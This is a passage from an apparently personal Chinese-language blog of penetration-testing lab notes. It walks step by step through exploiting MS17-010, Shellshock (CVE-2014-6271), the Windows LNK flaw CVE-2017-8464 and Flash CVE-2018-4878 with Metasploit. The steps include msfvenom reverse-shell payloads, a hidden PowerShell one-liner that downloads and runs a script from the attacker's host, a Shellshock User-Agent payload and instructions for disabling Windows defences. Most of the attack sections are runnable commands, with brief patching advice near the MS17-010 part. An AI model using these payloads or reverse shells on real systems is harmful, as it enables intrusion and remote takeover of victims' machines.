<li>防火墙必须允许SMB流量出入<br>
<ul class="org-ul">
<li>关闭 win7 防火墙<br>
<ul class="org-ul">
<li>控制面板 &#x2013;&gt; 系统和安全 &#x2013;&gt; windows 防火墙 &#x2013;&gt; 打开或关闭 windows 防火墙<br></li>
</ul></li>
</ul></li>
<li>目标必须使用SMBv1协议 √<br>
<ul class="org-ul">
<li>win7 默认满足<br></li>
</ul></li>
<li>目标必须缺少MS17-010补丁 √<br>
<ul class="org-ul">
<li>win7 默认满足<br></li>
</ul></li>
<li>目标必须允许匿名 <code>IPC $和管道名</code><br>
<ul class="org-ul">
<li>打开 win7 开启主策略： Ctrl + r 运行 pgedit.msc<br></li>
<li>Windows 设置 &#x2013;&gt; 安全设置 &#x2013;&gt; 本地策略 &#x2013;&gt; 安全选项 &#x2013;&gt; 网络访问:限制对命名管道和共享的匿名访问 开启改为已禁用<br></li>
<li>重启机器<br></li>
</ul></li>
</ul>



<div class="org-src-container">
<pre class="src src-sh">msfconsole //&#36827;&#20837; msf
search ms17-010 //&#26597;&#25214;ms17-010&#28431;&#27934;&#21033;&#29992;&#27169;&#22359;
use exploit/windows/smb/ms17_010_psexec //&#20351;&#29992;&#25915;&#20987;&#27169;&#22359;
<span style="color: #483d8b;">set</span> RHOSTS 192.168.0.102 //&#35774;&#32622;&#25915;&#20987;IP

exploit //&#25915;&#20987;
shell //&#36827;&#20837;Windows cmd
</pre>
</div>
</div>
</div>
<div id="outline-container-org7522fca" class="outline-4">
<h4 id="org7522fca">扩展内容</h4>
<div class="outline-text-4" id="text-org7522fca">
<p>
MS17-010的五个漏洞利用模块：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">0 exploit/windows/smb/ms17_010_eternalblue
1 exploit/windows/smb/ms17_010_psexec
2 auxiliary/admin/smb/ms17_010_command
3 auxiliary/scanner/smb/smb_ms17_010&#65288;&#25195;&#25551;&#30446;&#26631;&#31995;&#32479;&#26377;&#27809;&#26377;&#28431;&#27934;&#65292;&#19981;&#36827;&#34892;&#21033;&#29992;&#33719;&#21462;&#65289;
4 exploit/windows/smb/smb_doublepulsar_rce&#65288;SMB&#21518;&#38376;&#65292;&#19981;&#29992;&#20851;&#27880;&#65289;
</pre>
</div>

<p>
攻击效果：<br>
0 模块：拿到了 meterpreter 命令行权限<br>
1 模块：拿到了 meterpreter 命令行权限<br>
2 模块：不能拿到了 meterpreter 命令行权限，需要在攻击之前设置好想要执行的命令<br>
3 模块：仅作扫描，不会进行漏洞利用<br>
</p>

<p>
利用条件：0模块不需要开启共享就能直接打，1、2则需要开启共享之后才能攻击成功。<br>
返回结果：0、1都能反弹shell进行命令控制，2只能返回命令执行的结果。<br>
总结下来，各个模块的攻击利用条件如下：<br>
</p>

<table>


<colgroup>
<col  class="org-right">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-right">漏洞模块</td>
<td class="org-left">防火墙必须允许SMB流量出入</td>
<td class="org-left">目标必须使用SMBv1协议</td>
<td class="org-left">目标必须缺少MS17-010补丁</td>
<td class="org-left">目标必须允许匿名IPC $和管道名</td>
</tr>

<tr>
<td class="org-right">0</td>
<td class="org-left">exploit/windows/smb/ms17_010_eternalblue</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-right">1</td>
<td class="org-left">exploit/windows/smb/ms17_010_psexec</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">auxiliary/admin/smb/ms17_010_command</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">auxiliary/scanner/smb/smb_ms17_010</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">√</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>
</div>
<div id="outline-container-orgc415da2" class="outline-5">
<h5 id="orgc415da2">MS17-010漏洞修复</h5>
<div class="outline-text-5" id="text-orgc415da2">
<ul class="org-ul">
<li>治本<br>
<ul class="org-ul">
<li>升级操作系统。很难用到，怕影响业务<br></li>
<li>更新(打补丁)。怕影响业务，做好备份恢复<br>
<ul class="org-ul">
<li>搜索ms17010补丁号<br></li>
<li>官方补丁下载页：<a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a><br></li>
</ul></li>
</ul></li>
<li>治标不治本<br>
<ul class="org-ul">
<li>关端口。取决于业务是否用这个端口<br></li>
<li>外围防护-部署安全软件<br></li>
<li>白名单<br>
<ul class="org-ul">
<li>通过 win7 自带防火墙配置<br></li>
</ul></li>
</ul></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-orgc742e5e" class="outline-3">
<h3 id="orgc742e5e">Bash Shellshock CVE-2014-6271（破壳）</h3>
<div class="outline-text-3" id="text-orgc742e5e">
</div>
<div id="outline-container-orgd7d10fb" class="outline-4">
<h4 id="orgd7d10fb">漏洞简介</h4>
<div class="outline-text-4" id="text-orgd7d10fb">
<p>
Shellshock的原理是利用了Bash在导入环境变量函数时所触发的漏洞，启动Bash的时候，它不但会导入函数，而且也会把函数后面的命令一并执行。在有些CGI脚本的设计中，数据是通过环境变量来传递的，这就给了数据提供者利用Shellshock漏洞的机会。<br>
</p>

<p>
简单来说就是由于服务器的CGI脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。<br>
</p>
</div>
</div>
<div id="outline-container-org9b0c2fa" class="outline-4">
<h4 id="org9b0c2fa">漏洞原理</h4>
<div class="outline-text-4" id="text-org9b0c2fa">
<p>
该 Bash 使用的环境变量通过函数名称来调用，导致漏洞的问题点是以 (){ 开头定义的环境变量在命令ENV 中解析成函数后， Bash 执行并未退出，而是继续解析并执行shell命令。<br>
</p>
</div>
</div>
<div id="outline-container-org8406b32" class="outline-4">
<h4 id="org8406b32">漏洞利用</h4>
<div class="outline-text-4" id="text-org8406b32">
</div>
<div id="outline-container-org8728823" class="outline-5">
<h5 id="org8728823">环境搭建</h5>
<div class="outline-text-5" id="text-org8728823">
<p>
docker下直接search该漏洞镜像<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">docker search CVE-2014-6271
docker run -d -p 8080:80 vulnerables/cve-2014-6271
docker ps //&#26597;&#30475;&#23481;&#22120;&#26159;&#21542;&#21551;&#21160;
</pre>
</div>

<p>
看到容器启动成功之后，访问 your_ip:8080 看到环境服务启动<br>
</p>



<figure id="orgec7ca14">
<img src="./images/img_20230726_163359.png" alt="img_20230726_163359.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-orgbb33866" class="outline-5">
<h5 id="orgbb33866">漏洞攻击</h5>
<div class="outline-text-5" id="text-orgbb33866">
<p>
使用Hackbar发送http请求，将payload附在User-Agent中执行，随后访问/cgi-bin/vulnerable：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">User-Agent: () { foo; }; <span style="color: #483d8b;">echo</span> Content-Type: text/plain; <span style="color: #483d8b;">echo</span>; /usr/bin/id
</pre>
</div>


<figure id="org0a5f46d">
<img src="./images/img_20230726_163527.png" alt="img_20230726_163527.png" width="60%"><br>

</figure>

<p>
<b>漏洞解析</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#65289;&#35774;&#32622;&#29615;&#22659;&#21464;&#37327;&#65292;&#20197; <span style="color: #ff00ff;">`() {`</span> &#24320;&#22836;&#65307;
2&#65289;&#21551;&#21160;&#23376;shell&#65307;
3&#65289;&#23376;shell&#20250;&#32487;&#25215;&#29238;&#36827;&#31243;&#30340;&#29615;&#22659;&#21464;&#37327;&#65292;&#24182;&#19988;&#24403;&#29615;&#22659;&#21464;&#37327;&#26159;&#20197; <span style="color: #ff00ff;">`() {`</span> &#24320;&#22836;&#30340;&#65292;&#20250;&#24403;&#20989;&#25968;&#25191;&#34892;&#12290;
</pre>
</div>
</div>
</div>
<div id="outline-container-org8519b1d" class="outline-5">
<h5 id="org8519b1d">使用msf进行利用</h5>
<div class="outline-text-5" id="text-org8519b1d">
<p>
使用 msfconsole 进入 msf 终端<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">search shellshock <span style="color: #8b2252;">\\</span>&#26597;&#25214; shellshock &#28431;&#27934;&#21033;&#29992;&#27169;&#22359;
use exploit/multi/http/apache_mod_cgi_bash_env_exec <span style="color: #8b2252;">\\</span>&#20351;&#29992;&#28431;&#27934;&#21033;&#29992;&#27169;&#22359;

options &#26597;&#30475;&#35774;&#32622;&#21442;&#25968;

<span style="color: #483d8b;">set</span> payload linux/x86/meterpreter/reverse_tcp // &#35774;&#32622;&#28431;&#27934;&#21033;&#29992;payload&#65292;&#23545;&#24212;&#25805;&#20316;&#31995;&#32479;&#29256;&#26412;
<span style="color: #483d8b;">set</span> RHOSTS your_ip // &#35774;&#32622;&#36828;&#31243;&#26381;&#21153;&#22320;&#22336;
<span style="color: #483d8b;">set</span> rport 80 // &#35774;&#32622;&#36828;&#31243;&#26381;&#21153;&#31471;&#21475;
<span style="color: #483d8b;">set</span> TARGETURI /victim.cgi // &#35774;&#32622;&#30446;&#26631;URI &#25110;&#32773; /cgi-bin/vulnerable
<span style="color: #483d8b;">set</span> target 1 // &#35774;&#32622;&#20026;&#23545;&#24212;&#34987;&#25915;&#20987;&#26426;&#22120;&#31995;&#32479;
check // &#26597;&#30475;&#26159;&#21542;&#23384;&#22312;&#28431;&#27934;

exploit // &#25915;&#20987;
</pre>
</div>



<figure id="org4275d55">
<img src="./images/img_20230726_163907.png" alt="img_20230726_163907.png" width="60%"><br>

</figure>

<p>
不一定都成功，主机漏洞不稳定性，多尝试，所有 payload 都尝试一下。<br>
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org15b6918" class="outline-3">
<h3 id="org15b6918">远程命令执行漏洞 CVE-2017-8464（震网三代）</h3>
<div class="outline-text-3" id="text-org15b6918">
</div>
<div id="outline-container-org225cf11" class="outline-4">
<h4 id="org225cf11">漏洞描述</h4>
<div class="outline-text-4" id="text-org225cf11">
<p>
2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。<br>
</p>

<p>
Windows系统使用二进制解析.LNK文件，当恶意二进制代码被系统识别执行时即可实现远程代码执行，由于是在explorer.exe进程中运行，所以 load 进内存时与当前用户具有相同权限。<br>
</p>

<p>
攻击者利用这一解析过程将包含恶意二进制的代码被附带进可移动驱动器（或远程共享过程中），受害者使用powershell解析 .LNK 文件后即被黑客所控制。<br>
</p>

<p>
成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。<br>
</p>
</div>
</div>
<div id="outline-container-org5735756" class="outline-4">
<h4 id="org5735756">影响版本</h4>
<div class="outline-text-4" id="text-org5735756">
<p>
cpe:2.3⭕️microsoft:windows_10:-:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_10:1511:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_10:1607:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_10:1703:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_7:-:sp1:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_8.1:-:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_rt_8.1:-:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_server_2008:-:sp2:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_server_2008:r2:sp1:*:*:*:*:itanium:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows server 2008:r2:sp1:*:*:*:*:x64:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_10:-:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_server_2012:-:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_server_2012:r2:*:*:*:*:*:*:* Show Matching CPE(s)<br>
cpe:2.3⭕️microsoft:windows_server_2016:-:*:*:*:*:*:*:* Show Matching CPE(s)<br>
</p>
</div>
</div>
<div id="outline-container-orgcac44cb" class="outline-4">
<h4 id="orgcac44cb">漏洞利用</h4>
<div class="outline-text-4" id="text-orgcac44cb">
<p>
1.在kali下使用 msfvenom 生成一个反弹shell<br>
</p>

<p>
msfvenom 是 msfpayload 和 msfencoder 的组合<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color: #a0522d;">lhost</span>=192.168.0.111 <span style="color: #a0522d;">lport</span>=4444 -f psh-reflection &gt; ~/xxx.ps1
<span style="color: #b22222;"># </span><span style="color: #b22222;">lhost &#20026; kali &#22320;&#22336;</span>
</pre>
</div>

<p>
2.将生成的xxx.ps1拷贝到/var/www/html目录下<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cp ~/xxx.ps1 /var/www/html/
</pre>
</div>

<p>
3.在kali中启动Apache服务<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">service apache2 start //&#40664;&#35748;80&#31471;&#21475;
</pre>
</div>

<p>
4.在win7系统中查看服务是否启动<br>
</p>


<figure id="org6341c21">
<img src="./images/img_20230726_164322.png" alt="img_20230726_164322.png" width="60%"><br>

</figure>

<p>
5.访问web下的xxx.ps1<br>
</p>

<p>
6.在靶机上创建一个快捷方式，并输入：<br>
</p>

<p>
输入对象的位置处填写<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">powershell -windowstyle hidden -exec bypass -c <span style="color: #8b2252;">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.111/xxx.ps1');test.ps1"</span>
</pre>
</div>

<p>
7.kali下创建监听反弹shell<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msfconsole
use exploit/multi/handler //&#20390;&#21548;&#27169;&#22359;
<span style="color: #483d8b;">set</span> payload windows/x64/meterpreter/reverse_tcp <span style="color: #b22222;"># </span><span style="color: #b22222;">payload &#21644; &#21046;&#20316;&#26408;&#39532;&#26102;&#19968;&#33268;</span>
<span style="color: #483d8b;">set</span> LHOST 192.168.0.111
show options
</pre>
</div>

<p>
8.kali上使用 exploit 开启监听<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">exploit
</pre>
</div>

<p>
9.windows上运行创建的powershell快捷方式<br>
快捷方式中的test.ps1，让powershell去执行test.ps1，但是test.ps1并不存在，所以没有实际意义。<br>
</p>

<p>
10.kali上接收到反弹shell<br>
</p>


<figure id="org8959570">
<img src="./images/img_20230726_164651.png" alt="img_20230726_164651.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-orgf7f9977" class="outline-3">
<h3 id="orgf7f9977">Flash漏洞 CVE-2018-4878</h3>
<div class="outline-text-3" id="text-orgf7f9977">
</div>
<div id="outline-container-org73ddf3f" class="outline-4">
<h4 id="org73ddf3f">漏洞简介</h4>
<div class="outline-text-4" id="text-org73ddf3f">
<p>
2018年2月1号，Adobe官方发布安全通报（APSA18-01），声明Adobe Flash 28.0.0.137及其之前的版本，存在高危漏洞（CVE-2018-4878）。<br>
</p>

<p>
攻击者通过构造特殊的Flash链接，当用户用浏览器/邮件/Office访问此Flash链接时，会被“远程代码执行”，并且直接被getshell。<br>
</p>

<p>
参考链接：<a href="https://blog.51cto.com/chenxinjie/2093653">https://blog.51cto.com/chenxinjie/2093653</a><br>
</p>
</div>
</div>
<div id="outline-container-org93815f9" class="outline-4">
<h4 id="org93815f9">影响版本</h4>
<div class="outline-text-4" id="text-org93815f9">

<figure id="orga682cad">
<img src="./images/img_20230726_164737.png" alt="img_20230726_164737.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-orgc5f0e01" class="outline-4">
<h4 id="orgc5f0e01">漏洞利用</h4>
<div class="outline-text-4" id="text-orgc5f0e01">
</div>
<div id="outline-container-org24596df" class="outline-5">
<h5 id="org24596df">漏洞环境</h5>
<div class="outline-text-5" id="text-org24596df">
<ul class="org-ul">
<li>Kali Linux + Windows 7 sp1<br></li>
<li>攻击机：Kali Linux<br></li>
<li>靶机：Windows 7 sp1<br></li>
<li><p>
exp漏洞利用脚本：cve-2018-4878.py<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">wget https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar
</pre>
</div></li>
<li>flash安装程序：flashplayer_activex_28.0.0.137.exe<br></li>
</ul>
</div>
</div>
<div id="outline-container-org247420a" class="outline-5">
<h5 id="org247420a">攻击流程</h5>
<div class="outline-text-5" id="text-org247420a">
<p>
1.在kali中使用 msfvenom 生成漏洞利用代码<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msfvenom -p windows/meterpreter/reverse_tcp <span style="color: #a0522d;">lhost</span>=192.168.0.111 <span style="color: #a0522d;">lport</span>=4445 -f python&gt;xxx_shellcode.txt
</pre>
</div>

<p>
2.查看生成的文件<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat ~/xxx_shellcode.txt
<span style="color: #b22222;"># </span><span style="color: #b22222;">shellcode &#32534;&#30721;&#29305;&#24449;&#65306;\x2&#20301;16&#36827;&#21046;&#25991;&#20214;</span>
</pre>
</div>

<p>
3.修改 CVE-2018-4878-master 文件夹中的 cve-2018-4878.py 文件<br>
</p>

<p>
stageless = False<br>
</p>

<p>
把shellcode内容换成刚生成的<br>
</p>

<p>
4.修改cve-2018-4878.py文件中的文件生成路径为自己的路径<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">f</span> = <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"/root/Desktop/CVE-2018-4878-master/%s"</span> % swf, <span style="color: #8b2252;">"wb"</span>)
f.write(data)
f.close()

<span style="color: #a0522d;">f</span> = <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"/root/Desktop/CVE-2018-4878-master/index2.html"</span>, <span style="color: #8b2252;">"wb"</span>)
f.write(html)
f.close()
</pre>
</div>

<p>
5.运行python脚本，生成2个程序exploit.swf index2.html，注意使用 python2 版本<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">python2 cve-2018-4878.py
</pre>
</div>

<p>
6.开启Apache服务，并将生成的两个文件拷贝到apache服务目录下<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">service apache2 start
sudo cp /home/xxx/Desktop/* /var/www/html //&#65288;&#21363;exploit.swf&#21644;index2.html&#65289;
</pre>
</div>

<p>
7.在kali上开启监听<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msfconsole use exploit/multi/handler
<span style="color: #483d8b;">set</span> payload windows/meterpreter/reverse_tcp
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27880;&#24847;&#22320;&#22336;&#21644;&#31471;&#21475;&#35201;&#21644;&#20351;&#29992;msfvenom&#21629;&#20196;&#29983;&#25104;shellcode&#26102;&#25152;&#29992;&#21040;&#30340;&#22320;&#22336;&#21644;&#31471;&#21475;&#20445;&#25345;&#19968;&#33268;</span>
<span style="color: #483d8b;">set</span> lhost 192.168.0.111
<span style="color: #483d8b;">set</span> lport 4445

exploit <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24320;&#21551;&#30417;&#21548;</span>
</pre>
</div>

<p>
8.Win7系统安装flash插件<br>
9.使用IE浏览器访问kali中我们生成好的 index2.html 页面<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">http://192.168.0.111/index2.html
</pre>
</div>

<p>
10.kaili中获得win7机器权限<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">exploit
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-org9ceb3fe" class="outline-3">
<h3 id="org9ceb3fe">MSF攻击流程总结</h3>
<div class="outline-text-3" id="text-org9ceb3fe">

<figure id="org26b38cb">
<img src="./images/img_20230726_165225.png" alt="img_20230726_165225.png" width="60%"><br>

</figure>

<ul class="org-ul">
<li>输入 msfconsole进入终端<br></li>
<li>search 命令查找对应漏洞利用模块<br></li>
<li>use 命令使用查找出来的漏洞利用模块<br></li>
<li>set 命令设置攻击参数<br></li>
<li>exploit/run 命令启动攻击<br></li>
<li>Getshell<br></li>
</ul>
</div>
</div>
</section>
</main class="container">
<footer id="postamble" class="status">
<footer data-astro-cid-sz7xmlte data-turbo-permanent id=rootFooter>
    <script>
        const shuffle = e => e.map((e => ({
            v: e,
            sort: Math.random()
        }))).sort(( (e, o) => e.sort - o.sort)).map(( ({v: e}) => e));
        var songList = ["barbie-girl--stantough", "blue-da-ba-dee--cornelius-link", "hips-dont-lie--stantough", "i-want-it-that-way--stantough", "seven-nation-army--stantough", "smooth-criminal--stantough"]
          , songOrder = songOrder ?? shuffle(songList).map((e => `/audio/music/${e}.opus`))
          , song = new Audio(songOrder[0])
          , nextSong = new Audio(songOrder[1])
          , songIndex = 2
          , musicWrapper = void 0
          , arrow = void 0
          , notes = void 0;
        song.addEventListener("ended", next);
        const toggle = () => song.paused ? play() : pause();
        function play() {
            song.play(),
            musicWrapper = musicWrapper || document.getElementById("musicWrapper"),
            notes = notes || document.getElementById("notesWrapper"),
            musicWrapper.classList.add("shakeManHorse"),
            notes.classList.remove("hideNotes")
        }
        function pause() {
            song.pause(),
            musicWrapper = musicWrapper || document.getElementById("musicWrapper"),
            notes = notes || document.getElementById("notesWrapper"),
            musicWrapper.classList.remove("shakeManHorse"),
            notes.classList.add("hideNotes")
        }
        function next() {
            song = nextSong,
            play(),
            songIndex === songOrder.length && (songIndex = 0),
            nextSong = new Audio(songOrder[songIndex]),
            songIndex += 1
        }
        function skip() {
            pause(),
            (arrow = arrow || document.getElementById("musicArrow")).classList.add("shootArrow");
            new Audio("/audio/effects/ohno.m4a").play(),
            arrow.addEventListener("animationend", arrowShootHandler, !1)
        }
        function arrowShootHandler() {
            arrow.removeEventListener("animationend", arrowShootHandler, !1),
            arrow.classList.remove("shootArrow");
            new Audio("/audio/effects/heythathurt.m4a").play(),
            next()
        }
    </script>
    <div id=musicPlayer data-astro-cid-q7a5pyro>
        <button class=skip data-astro-cid-q7a5pyro onclick=skip() title="Skip song">
            <div id=skipWrapper data-astro-cid-q7a5pyro>
                <img alt="Medieval drollery of a man/snail/bat/monkey shooting an arrow" class=archer decoding=async height=334 loading=lazy src=/images/archer-no-arrow.448ccd8b_Z1KfRYq.webp width=226 data-astro-cid-q7a5pyro>
                <img alt="Arrow for archer" class="arrow complete" decoding=async height=23 loading=lazy src=/images/no-archer-full-arrow.87aa9971_Z2qL2KO.webp width=141 data-astro-cid-q7a5pyro id=musicArrow>
            </div>
        </button>
        <button class=playPause data-astro-cid-q7a5pyro onclick=toggle() title="Play/pause song">
            <div id=musicWrapper data-astro-cid-q7a5pyro>
                <div class=hideNotes id=notesWrapper data-astro-cid-q7a5pyro>
                    <div class=lyreNotes data-astro-cid-6gcrueho>
                        <div class=note1 data-astro-cid-6gcrueho>&#9835;&#9833;</div>
                        <div class=note2 data-astro-cid-6gcrueho>&#9833;</div>
                        <div class=note3 data-astro-cid-6gcrueho>&#9839;&#9834;</div>
                        <div class=note4 data-astro-cid-6gcrueho>&#9834;</div>
                    </div>
                    <div class=fluteNotes data-astro-cid-6gcrueho>
                        <div class=note1 data-astro-cid-6gcrueho>&#9835;&#9833;</div>
                        <div class=note2 data-astro-cid-6gcrueho>&#9833;</div>
                        <div class=note3 data-astro-cid-6gcrueho>&#9839;&#9834;</div>
                        <div class=note4 data-astro-cid-6gcrueho>&#9834;</div>
                    </div>
                </div>
                <img alt="Medieval drollery of a man/horse playing a lyre and a horn" class=manHorse decoding=async height=665 loading=lazy src=/images/man-horse-band.e3a2efcf_q8FCa.webp width=531 data-astro-cid-q7a5pyro>
            </div>
        </button>
    </div>
    <hr data-astro-cid-sz7xmlte>
    <div class=salutation data-astro-cid-gdmrbrho>
        <p data-astro-cid-gdmrbrho>
            <span class=flower2 data-astro-cid-gdmrbrho>A</span>
            <span class=smallcap data-astro-cid-gdmrbrho>pax vobiscum</span>
            <span class="flower2 wiggle" data-astro-cid-gdmrbrho id=leaf>a</span>
        </p>
    </div>
    <script>
        function animateLeafBlownHandler() {
            leaf.removeEventListener("animationend", animateLeafBlownHandler, !1),
            leaf.classList.remove("blownAway"),
            leaf.classList.add("wiggle")
        }
        function animateLeaf() {
            leaf = leaf ?? document.getElementById("leaf"),
            leaf.classList.remove("wiggle"),
            leaf.classList.add("blownAway"),
            leaf.addEventListener("animationend", animateLeafBlownHandler, !1)
        }
        document.getElementById("leaf").onclick = animateLeaf
    </script>


    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
